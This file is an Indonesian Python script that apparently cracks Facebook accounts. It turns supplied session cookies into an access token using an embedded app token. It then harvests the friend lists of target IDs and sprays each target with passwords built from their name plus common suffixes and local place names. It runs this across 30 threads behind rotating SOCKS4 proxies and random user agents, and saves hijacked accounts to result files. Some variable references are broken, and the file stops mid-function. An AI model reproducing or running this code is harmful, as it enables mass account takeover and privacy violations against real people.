def author(pm_aink):
	print(f'{K}[{P}•{K}]{P} LISENSI ANDA : 1XX2_2839_1XAJ_1111')
	print(f'{K}[{P}•{K}]{P} Tunggu Sebentar Nanti Diarahin Ke WhatsApp ...')
	time.sleep(3)
	os.system("xdg-open https://wa.me/6281222618908")
	exit()
#----------[ IMPORT-MODULE ]----------#
import re,os,sys,rich,bs4,time, json,urllib3,base64,random,datetime,requests
from bs4 import BeautifulSoup as sop
from rich.console import Console as sol
from rich import print as prints
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as tred
from rich import pretty
from rich.tree import Tree
from rich.table import Table
from rich.text import Text as tekz
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.markdown import Markdown as mark
from rich.panel import Panel as nel
#----------[ GLOBAL-NAME ]----------#
#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
import re,requests,os,time
import os,sys
import socket,threading
import datetime
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as AsepXc
from bs4 import BeautifulSoup as parse
from time import time as mek
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from rich.panel import Panel
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.console import Console
from rich import print as cetak
from rich.columns import Columns
from rich import print as Buat
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from getpass import getpass
from rich.text import Text as tekz
from rich.progress import track
from pwinput import pwinput
from rich.console import Console
wa = Console()
console = Console()
#MODUL FIX EROR#
pretty.install()
id2,uid=[],[]
proxxy,ugen=[],[]
dump,id,akun=[],[],[]
method,tokenku=[],[]
pwpluss,pwnya=[],[]
loop,ok,cp=0,0,0
CON=sol()
console=Console()
ses=requests.Session()
ualu =[]
ualuh = []
#----------[ GET-PROXY ]----------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(proxy)
except Exception as e:
    proxy=open('.prox.txt','r').read().splitlines()
    
#----------[ USER-AGENT ]----------#	
for khontol in range(9999):
    rc = random.choice; rr = random.randint
    android_versi = str(rr(5,13))
    chrome_versi = f"{str(rr(40,113))}.0.{str(rr(3000,5999))}.{str(rr(10,299))}"
    instagram_versi = f"{str(rr(100,299))}.0.0.{str(rr(10,99))}.{str(rr(10,599))}"
    kyu1 = f'Mozilla/5.0 (Linux; Android {android_versi}; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_versi} Mobile Safari/537.36'
    ua_aink=(f'{kyu1}')
    ugen.append(ua_aink)
    kyu2 = f'Mozilla/5.0 (Linux; Android {android_versi}; SM-M307F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_versi} Mobile Safari/537.36'
    ua_aink=(f'{kyu2}')
    ugen.append(ua_aink)
    kyu3 = f'Mozilla/5.0 (Linux; Android {android_versi}; SM-M307F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_versi} Mobile Safari/537.36'
    ua_aink=(f'{kyu3}')
    ugen.append(ua_aink)
#--------[ GENERATE-USER-AGENT ]----------#
for eksdi in range(10):
	a=random.choice(['7','8','9','10','11','12','13'])
	b=random.choice(['7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#WARNA PRINT IMPORT RICH#
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	colorbapa = random.choice([H2,K2,M2,B2,P2]) 
	color_panel = "#FFFFFF"
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
x = '\33[m' # DEFAULT
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' 
bv = '\33[0;36m'
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
#----------[ CONVERTER-BULAN ]----------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
pengguna = 'Premium'

#
def krek_cer(berjalan):
        for krek_cer in berjalan + "\n":sys.stdout.write(krek_cer);sys.stdout.flush();time.sleep(0.01)
#------ KONTOL--------#
os.system('clear')
krek_cer(f"""{hijo}
████    █████████████ 
████    █████████████ 
████   █████           
██████████████       
█████████████████████  
       ██████████████
        ██████   ████
█████████████    ████
█████████████    ████""")
input("\n\033[95m[\033[97m?\033[95m] \033[97mEnter Your Name \033[97m:\033[92m ")
Password = "1234"
_Gass_nge_krek_ = input(f'{kun}{x}[{hijo}•{x}] Input Password : ')
if _Gass_nge_krek_ in ['123','321','0202','124']:
	Password
#-----------[ DEF LOGIN T9OLS ----------#
def password():
	'1234'
#----------[ GARIS-KERAS ]----------#
def kopi():
	print(f"{hijo}_______________________________")
#----------[ KESALAHAN ]----------#	       
def help():
	krek_cer(f"\x1b[1;93m\x1b[1;97m[\x1b[1;91m•\x1b[1;97m] pilih yg bener bro :-(")
	login() 

#----------[ MACHINE-SUPPORT ]----------#		
def krek_cer(berjalan):
        for krek_cer in berjalan + "\n":sys.stdout.write(krek_cer);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
#----------[ BANNER ]----------#	
def banner():
	clear()
	print('')
#----------[ NGECEK COOKIES ]----------#
def login():
	try:
		token = open('.PotraitXDtoken.txt','r').read()
		cok = open('.PotraitXDcokies.txt','r').read()
		tokenku.append(token)
		try:
			gass = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			krek = json.loads(gass.text)['id']
			fesbuk = json.loads(gass.text)['name']
			menu(krek,fesbuk)
		except KeyError:
			login_lagi()
		except requests.exceptions.ConnectionError:
			krek_cer(f'{kun}{x}[{mer}•{x}]{mer} Koneksi Anda Bermasalah :-( ');exit()
	except IOError:
		login_lagi()
		
#----------[ LOGIN-COOKIES ]----------#		
def login_lagi():
	try:
		os.system('clear');banner()
		your_cookies = input(f'{kun}{x}[{hijo}•{x}] Masukan Cookies {hijo}: ')
		with requests.Session() as r:
			try:
				r.headers.update({
				'content-type': 'application/x-www-form-urlencoded',
				})
				data = {
				'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01',
				'scope': ''}
				response = json.loads(r.post(
				'https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = (
				'https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
				})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					krek_cer(f"{kun}{x}[{mer}•{x}]{mer} Cookies Anda Invalid :-(", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search(
					'name="fb_dtsg" value="(.*?)"', 
					str(response2)).group(1)
					jazoest = re.search(
					'name="jazoest" value="(\d+)"', 
					str(response2)).group(1)
					data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'qr': 0,'user_code': user_code,}
					r.headers.update({
					'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
					})
					response3 = r.post(
					'https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop(
						'content-type');r.headers.pop(
						'origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search(
						'action="(.*?)"', 
						str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search(
						'name="fb_dtsg" value="(.*?)"', 
						str(response4)).group(1)
						jazoest = re.search(
						'name="jazoest" value="(\d+)"', 
						str(response4)).group(1)
						scope = re.search(
						'name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search(
						'name="display" value="(.*?)"', 
						str(response4)).group(1)
						user_code = re.search(
						'name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search(
						'name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search(
						'name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search(
						'name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search(
						'name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({
						'origin': 'https://m.facebook.com','referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
						})
						data = {
						'fb_dtsg': fb_dtsg,
						'jazoest': jazoest,
						'scope': scope,
						'display': display,
						'user_code': user_code,
						'logger_id': logger_id,
						'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,
						'return_format[]': return_format,}
						response5 = r.post(
						'https://m.facebook.com{}'.format(action), data = data, cookies = {
						'cookie': your_cookies}).text
						windows_referer = re.search(
						'window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop(
						'content-type');r.headers.pop('origin')
						r.headers.update({
						'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
							})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"{kun}{x}[{hijo}•{x}] Token {hijo}: {access_token}")
							tokenew = open(".PotraitXDtoken.txt","w").write(access_token)
							cook= open(".PotraitXDcokies.txt","w").write(your_cookies)
							print(f"{kun}{x}[{hijo}•{x}] Login Berhasil Jalankan Ulang Python Run.py");exit()
			except Exception as e:
				krek_cer(f"{kun}{x}[{mer}•{x}]{mer} Login gagal cek tumbal lo ngab :-(")
				os.system('rm -rf .PotraitXDcokies.txt && rm -rf .PotraitXDtoken.txt');print(e);time.sleep(3)
				back()
	except:pass

tanda = '+'
#----------[ BAGIAN-MENU ]----------#
def menu(id,name):
	try:
		token = open('.PotraitXDtoken.txt','r').read()
		cok = open('.PotraitXDcokies.txt','r').read()
	except IOError:
		print('[•] Cookies Kadaluarsa ')
		time.sleep(2)
		login_lagi()
	os.system('clear')
	banner()
	try:cek_data = requests.get("http://ip-api.com/json/").json()
	except:cek_data = {'-'}
	try:card = cek_data["isp"]
	except:card = {'-'}
	try:indo = cek_data["country"]
	except:indo = {'-'}
	try:zone = cek_data["timezone"]
	except:zone = {'-'}
	try:lat = cek_data["lat"]
	except:lat = {'-'}
	try:lon = cek_data["lon"]
	except:lon = {'-'}
	try:Lokasi = cek_data["city"]
	except:Lokasi = {'-'}
	try:pickkartu=cek_data["as"]
	except:pickkartu = {'-'}
	try:Iplu=cek_data["query"]
	except:Iplu = {'-'}
	try:ng=cek_data["country"]
	except:ng = {'-'}
	krek_cer(f'{x}{x}Your Name : {hijo}{name} {x}- {x}Your IP : {hijo}{Iplu}')
	krek_cer(f'{x}{x}Your Idz : {hijo}{id} {x}- {x}Country : {indo}')
	krek_cer(f'{kun}{x}[{hijo}01{x}] Crack Publik          {x}[{hijo}ON{x}]')
	krek_cer(f'{kun}{x}[{hijo}02{x}] Crack Publik Masall   {x}[{hijo}ON{x}]')
	krek_cer(f'{kun}{x}[{hijo}03{x}] Crack File.           {x}[{hijo}ON{x}]')
	krek_cer(f'{kun}{x}[{hijo}04{x}] Cek Result            {x}[{hijo}ON{x}]')
	krek_cer(f'{kun}{x}[{hijo}05{x}] Lapor Bug Sc Error    {x}[{hijo}ON{x}]')
	krek_cer(f'{kun}{x}[{mer}00{x}] Hapus Cookies         {x}[{hijo}ON{x}]')
	_Gass_nge_krek_ = input(f'{kun}{x}[{hijo}•{x}] Input : ')
	kopi()
	print('')
	if _Gass_nge_krek_ in ['1','01']:
		crack_publik()
	elif _Gass_nge_krek_ in ['2','02']:
		krek_publik()
	elif _Gass_nge_krek_ in ['3','03']:
		file_dump()
	elif _Gass_nge_krek_ in ['4','04']:
		cek_result()
	elif _Gass_nge_krek_ in ['5','05']: 
		author('pm_aink')
	elif _Gass_nge_krek_ in ['0','00']:
		os.system('rm -rf .PotraitXDcokies.txt && rm -rf .PotraitXDtoken.txt')
		krek_cer(f'{kun}{x}[{mer}•{x}]{mer} Suckses hapus cookies');exit()
	else:
		help()

#----------[ CRACK-PUBLIK ]----------#
def krek_publik():
	try:
		token = open('.PotraitXDtoken.txt','r').read()
		cok = open('.PotraitXDcokies.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{kun}{x}[{hijo}•{x}] Berapa Target : '))
	except ValueError:
		help()
	if jum<1 or jum>100:
	    krek_cer(f'{kun}{x}[{mer}•{x}]{mer} Gagal Dump Idz ');back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f"{kun}{x}[{hijo}•{x}] Idz Target Ke "+str(yz)+f"{hijo} : ")
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			krek_cer(f'{kun}{x}[{mer}•{x}]{mer} Cek Sinyal Lo Ngab :-(')
	try:
		print(f'{kun}{x}[{hijo}•{x}] Total Idz Target {hijo}'+str(len(id)))
		kopi()
		print('')
		atur_ter()
	except requests.exceptions.ConnectionError:
		krek_cer(f'{kun}{x}[{mer}•{x}]{mer} Cek Sinyal Lo Ngab :-(')
	except (KeyError,IOError):
		krek_cer(f'{kun}{x}[{mer}•{x}]{mer} Pertemanan Tidak Publik ');time.sleep(2);back()
#PUBLIK KREK#
def crack_publik():
	try:
		token = open('.PotraitXDtoken.txt','r').read()
		cok = open('.PotraitXDcokies.txt','r').read()
	except IOError:
		exit() 
	aink_gabut = input(f'{x}[{H}•{x}]{x} Target : ')
	try:
		aink_raka = ses.get('https://graph.facebook.com/v2.0/'+aink_gabut+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
		for ricode_bang in aink_raka['friends']['data']:
			try:id.append(ricode_bang['id']+'|'+ricode_bang['name'])
			except:continue
		krek_cer(f'{kun}{x}[{hijo}•{x}] Total  : '+str(len(id)))
		kopi()
		print('')
		atur_ter()
	except requests.exceptions.ConnectionError:
		krek_cer(f'{K}[{P}•{K}]{P} Koneksi Internet Bermasalah')
	except (KeyError,IOError):
		krek_cer(f'{K}[{P}•{K}]{P} Pertemanan Tidak Publik ')
		back()
###----------[ CRACK  FILE ]----------###
def file_dump():
	mz = 0
	bzz = {}
	try:baz_gtg = os.listdir('/sdcard/DUMP/')
	except FileNotFoundError:
		print('{kun}{x}[{hijo}•{x} file dump tidak ada ster ')
		print('{kun}{x}[{hijo}•{x} buat file terlebih dahulu ')
		time.sleep(2)
		back()
	if len(baz_gtg)==0:
		print('{kun}{x}[{hijo}•{x}] file dump tidak ada ster ')
		print('{kun}{x}[{hijo}•{x} buat file terlebih dahulu ')
		time.sleep(2)
		back()
	else:
		for file_id in baz_gtg:
			try:pen_file = open('/sdcard/DUMP/'+file_id,'r').readlines()
			except:continue
			mz+=1
			if mz<100:
				jumh = ''+str(mz)
				bzz.update({str(mz):str(file_id)})
				bzz.update({jumh:str(file_id)})
				print(f'[•] %s. %s ({hijo} %s{x} )'%(jumh,file_id,len(pen_file)))
			else:
				bzz.update({str(mz):str(file_id)})
				print('['+str(mz)+'] '+file_id+' [ '+str(len(pen_file))+' akun ]'+x)
				print('[•] %s. %s ({hijo} %s {x}) '%(mz,file_id,len(pen_file)))
		_chos_baz = input(f'{x}[{H}•{x}]{x} Input : ')
		kopi()
		print()
		try:gaz_sung = bzz[_chos_baz]
		except KeyError:
			print(f'[•] yang bener milihnya {x}')
			time.sleep(2)
			file_dump()
		try:cekz_ = open('/sdcard/DUMP/'+gaz_sung,'r').read().splitlines()
		except:
			print('{x}[•]filenya tidak ada ')
			waktu(2)
			back()
		for idnyh in cekz_:
			id.append(idnyh)
		atur_ter()
#----------[ CEK-RESULT ]----------#
def cek_result():
	print(f'{kun}{x}[{hijo}•{x}] Hasil OK ')
	print(f'{kun}{x}[{hijo}•{x}] Hasil CP ')
	kz = input(f'{kun}{x}[{hijo}•{x}] Input : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			krek_cer(f'{kun}{x}[{mer}•{x}] File tidak di temukan ');time.sleep(2);back()
		if len(vin)==0:
			print(f'{kun}{x}[{mer}•{x}] Anda tidak memiliki hasil Cp ');time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{kun}{x} %s. %s ({kun} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'{kun}{x}[{hijo}•{x}] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				help()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				krek_cer(f'{kun}{x}[{mer}•{x}] File tidak di temukan ');time.sleep(2);back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{kun} {kun}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			input(f'{kun} [{hijo} Klik Enter {kun}]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			krek_cer(f'{kun}{x}[{mer}•{x}] File tidak di temukan ');time.sleep(2);back()
		if len(vin)==0:
			print(f'{kun}{x}[{mer}•{x}] Anda tidak memiliki hasil Ok ');time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{kun}{x} %s. %s ( {hijo}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{kun}{x} %s. %s ({hijo} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'{kun}{x}[{hijo}•{x}] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				help()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				krek_cer(f'{kun}{x}[{mer}•{x}] File tidak di temukan ');time.sleep(2);back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{kun} {hijo}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			input(f'{kun} {x}[{hijo} Klik Enter {x}]')
			back()
	elif kz in ['3']:
		back()
	else:
		help()								
#----------[ MENU-METODE ]----------#
def atur_ter():
	for cape_euy in id:
		id2.insert(0,cape_euy)
	krek_cer(f'{x}[{H}•{x}] Method : {H}Validate {P} Ketik {K}Gasskeun')
	krek_cer(f'{x}[{H}•{x}] Method : {H}Reguler {P} Ketik {K}Run')
	krek_cer(f'{x}[{H}•{x}] Method : {H}Async {P} Ketik {K}Start')
	_Kang_Recode_Kontol = input(f'{x}[{H}•{P}]{P} Ketik  : {H}')
	print()
	if _Kang_Recode_Kontol in ['Gasskeun','Gass','GASS','gasskeun']:
		method.append('mobile')
	elif _Kang_Recode_Kontol in ['RUN','run','Run']:
		method.append('mbasic')
	elif _Kang_Recode_Kontol in ['Start','star','START']:
		method.append('async')
	else:
		method.append('mobile')
	pwplus=input(f"{x}[{hijo}•{x}]{x} Tambahkan Password Manual y/t : ") 
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f"{x}[{hijo}•{x}]{x} Input Password : ")
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	passwrd()
#----------[ BAGIAN-WORDLIST ]----------#	
def passwrd():
	global prog,des
	clear()
	krek_cer(f"""{hijo}
████    █████████████ 
████    █████████████ 
████   █████           
██████████████       
█████████████████████  
       ██████████████
        ██████   ████
█████████████    ████ 
█████████████    ████""")
	print(f'{kun}{x}[{hijo}•{x}] MAINKAN MODE PESAWAT SETIAP 300 IDZ ')
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append('linggar')
						pwv.append('rancaekek')
						pwv.append('sumedang')
						pwv.append('jatinangor')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append('linggar')
						pwv.append('rancaekek')
						pwv.append('sumedang')
						pwv.append('jatinangor')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
				    pool.submit(metod1,idf,pwv)
				elif 'mbasic' in method:
				    pool.submit(metod2,idf,pwv)
				elif 'async' in method:
				    pool.submit(metod3,idf,pwv,'free.facebook.com')
				elif 'mbeta' in method:
				    pool.submit(metod4,idf,pwv)
				else:
				    pool.submit(metod1,idf,pwv)
				 
	print(f'{kun}{x}[{hijo}•{x}] OK {hijo}: %s'%(ok))
	print(f'{kun}{x}[{hijo}•{x}] CP {kun}: %s'%(cp))
#----------[ METODE-VALIDATE ]----------#	
def metod1(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white]Validate [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]LIVE:[green]{(ok)}[/] [yellow]CHECK:[yellow]{(cp)}')
	prog.advance(des) 
	ua2 = random.choice(ugen)
	ua = random.choice('Mozilla/5.0 (Linux; U; Android 10; fr-fr; SM-M305F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36')
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
